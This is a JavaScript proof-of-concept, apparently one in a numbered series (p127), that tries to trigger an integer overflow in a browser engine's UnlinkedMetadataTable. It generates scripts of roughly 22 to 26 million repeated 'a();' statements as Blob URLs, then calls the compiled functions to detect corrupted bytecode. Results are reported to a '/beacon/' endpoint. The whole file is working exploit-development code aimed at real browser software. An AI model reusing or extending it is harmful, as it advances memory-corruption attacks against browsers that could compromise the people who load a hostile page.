// p127 — UnlinkedMetadataTable overflow via Blob URL script loading
// Avoids p125's failure: instead of building 120MB+ JS string with .repeat(),
// build the source as ArrayBuffer chunks (native memory, not JS heap),
// wrap in Blob, load via <script src=blobURL>
//
// Each 'a();' = 4 bytes, generates ~3 metadata entries (resolve_scope,
// get_from_scope, call). At ~176 bytes metadata per statement:
//   2^32 / 176 ≈ 24.4M entries needed for overflow
//
// Strategy: Build in 2MB chunks (500K reps each), combine into Blob,
// load as script. Tests scale from 22M to 26M.
//
// B1: 22M — below overflow threshold, should compile clean
// B2: 24M — near threshold
// B3: 25M — should overflow
// B4: 26M — deeper overflow
(function(){
var rid='v127m'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V127M-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V127M-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe127-start');

// Pattern bytes for 'a();'
var PATTERN = [97, 40, 41, 59]; // a, (, ), ;

function buildChunk(reps) {
  var bytes = reps * 4;
  var buf = new ArrayBuffer(bytes);
  var view = new Uint8Array(buf);
  for (var i = 0; i < bytes; i += 4) {
    view[i] = 97;   // 'a'
    view[i+1] = 40; // '('
    view[i+2] = 41; // ')'
    view[i+3] = 59; // ';'
  }
  return buf;
}

function gcPressure() {
  for (var g = 0; g < 30; g++) { var tmp = new ArrayBuffer(4194304); tmp = null; }
}

var tests = [
  {name:'B1-22M', n:22000000},
  {name:'B2-24M', n:24000000},
  {name:'B3-25M', n:25000000},
  {name:'B4-26M', n:26000000}
];

var testIdx = 0;

function runTest(test) {
  return new Promise(function(resolve) {
    var r = {n: test.n, bytes: test.n * 4};
    beacon(test.name + '-PRE', 'building-' + test.n);
    var t0 = Date.now();

    try {
      // Build source as ArrayBuffer chunks (2MB each = 500K reps)
      var CHUNK_REPS = 500000;
      var numChunks = Math.ceil(test.n / CHUNK_REPS);
      var chunks = [];
      var t1 = Date.now();

      for (var c = 0; c < numChunks; c++) {
        var thisChunkReps = Math.min(CHUNK_REPS, test.n - c * CHUNK_REPS);
        chunks.push(buildChunk(thisChunkReps));
      }
      r.chunkTime = Date.now() - t1;
      r.numChunks = chunks.length;

      // Build the function wrapper
      // Use a unique function name per test to avoid conflicts
      var funcName = '__mto_' + test.name.replace(/[^a-zA-Z0-9]/g, '');
      var header = new TextEncoder().encode(
        'var ' + funcName + '_ok=false;var ' + funcName + '_cc=0;' +
        'function ' + funcName + '(a){'
      );
      var footer = new TextEncoder().encode(
        '}' + funcName + '_ok=true;'
      );

      // Combine into Blob
      var parts = [header];
      for (var i = 0; i < chunks.length; i++) parts.push(chunks[i]);
      parts.push(footer);

      var t2 = Date.now();
      var blob = new Blob(parts, {type: 'text/javascript'});
      r.blobSize = blob.size;
      r.blobTime = Date.now() - t2;

      // Free chunk buffers — Blob holds its own copy
      chunks = null;
      parts = null;
      header = null;
      footer = null;
      gcPressure();

      // Create Blob URL and load as script
      var url = URL.createObjectURL(blob);
      r.blobURL = url ? 'ok' : 'fail';

      var script = document.createElement('script');
      var loadTimeout = setTimeout(function() {
        r.timeout = true;
        r.totalTime = Date.now() - t0;
        beacon(test.name, r);
        script.remove();
        URL.revokeObjectURL(url);
        resolve();
      }, 120000); // 2 minute timeout per test

      script.onload = function() {
        clearTimeout(loadTimeout);
        r.loaded = true;
        r.compileTime = Date.now() - t2;

        // Check if the function was defined and is callable
        try {
          r.funcDefined = (typeof window[funcName] === 'function');
          r.okFlag = window[funcName + '_ok'];

          if (r.funcDefined) {
            // Try calling it to detect corrupted bytecode
            var callCount = 0;
            try {
              window[funcName](function() {
                callCount++;
                if (callCount > 5) throw new Error('STOP');
              });
            } catch(e) {
              if (e.message === 'STOP') {
                r.callsOK = true;
              } else {
                r.callErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
              }
            }
            r.callCount = callCount;
          }
        } catch(e) {
          r.testErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
        }

        r.totalTime = Date.now() - t0;
        beacon(test.name, r);
        script.remove();
        URL.revokeObjectURL(url);
        // Cleanup
        try { delete window[funcName]; } catch(e) {}
        try { delete window[funcName + '_ok']; } catch(e) {}
        gcPressure();
        resolve();
      };

      script.onerror = function(e) {
        clearTimeout(loadTimeout);
        r.scriptError = true;
        r.errorType = e ? (e.type || 'unknown') : 'null';
        r.totalTime = Date.now() - t0;
        beacon(test.name, r);
        script.remove();
        URL.revokeObjectURL(url);
        resolve();
      };

      document.head.appendChild(script);

    } catch(e) {
      r.buildErr = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
      r.totalTime = Date.now() - t0;
      beacon(test.name, r);
      resolve();
    }
  });
}

async function runAll() {
  for (var t = 0; t < tests.length; t++) {
    await runTest(tests[t]);
    // Wait between tests for GC
    gcPressure();
    await new Promise(function(r) { setTimeout(r, 2000); });
  }
  beacon('DONE', 'all-' + tests.length);
}
runAll();
})();
